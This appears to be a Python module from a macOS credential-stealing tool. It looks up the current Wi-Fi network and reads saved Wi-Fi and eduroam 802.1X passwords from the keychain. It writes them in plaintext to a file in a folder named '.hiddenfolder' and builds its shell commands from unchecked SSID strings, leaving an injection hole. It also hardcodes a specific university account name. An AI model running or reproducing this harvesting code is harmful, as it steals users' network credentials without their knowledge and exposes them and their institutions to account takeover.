import subprocess
from logger_setup import operation_logger
import os

log_dir = os.path.join(os.path.expanduser("~"), ".hiddenfolder")

ssid_to_account = {
    "eduroam": "z5455543@ad.unsw.edu.au",
    "uniwide": "z5455543",
    # other mappings as needed
}

def get_current_wifi_ssid():
    try:
        result = subprocess.check_output("networksetup -getairportnetwork en0", shell=True).decode().strip()
        return result.split(": ")[1] if "Current Wi-Fi Network: " in result else None
    except subprocess.CalledProcessError:
        operation_logger.error("Failed to get current Wi-Fi network.")
        return None

def get_wifi_password(ssid):
    account = ssid_to_account.get(ssid, ssid)
    command = f'security find-generic-password -D "802.1X Password" -a "{account}" -w' if account != ssid else f'security find-generic-password -D "AirPort network password" -s "{ssid}" -w'

    try:
        password = subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, text=True).strip()
        with open(os.path.join(log_dir, "wifi_password.txt"), "w") as f:
            f.write(f"Password for SSID '{ssid}': {password}\n")
        operation_logger.info(f"Password for SSID '{ssid}' saved.")
    except subprocess.CalledProcessError as e:
        operation_logger.error(f"Could not retrieve password for SSID '{ssid}': {e}")
    except Exception as e:
        operation_logger.error(f"Unexpected error: {e}")
